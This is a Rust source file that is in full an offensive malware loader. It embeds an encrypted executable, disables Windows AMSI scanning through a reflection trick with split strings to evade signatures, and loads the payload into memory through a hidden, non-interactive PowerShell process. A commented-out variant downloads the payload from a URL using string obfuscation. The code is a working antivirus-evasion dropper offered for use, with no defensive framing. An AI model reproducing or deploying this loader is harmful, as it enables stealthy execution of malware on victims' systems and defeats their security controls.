use base64;
use include_crypt::{EncryptedFile, include_crypt};
use powershell_script::PsScriptBuilder;

fn main() {
    static FILE: EncryptedFile = include_crypt!("C:\\Users\\Desktop\\YourFile.exe");

    //  use litcrypt::{lc, use_litcrypt};
    //  use reqwest;
    //  let bytes =  reqwest::blocking::get(lc!("https://example.com/file.exe)).unwrap().bytes();



    let new = base64::encode(FILE.decrypt());
    let script = "[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
    [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"".to_owned() + new.as_str() + "\")).EntryPoint.Invoke($null, $null)";

    let ps = PsScriptBuilder::new()
        .no_profile(true)
        .non_interactive(true)
        .hidden(true)
        .print_commands(false)
        .build();
    let _output = ps.run(script.as_str()).unwrap();
}


//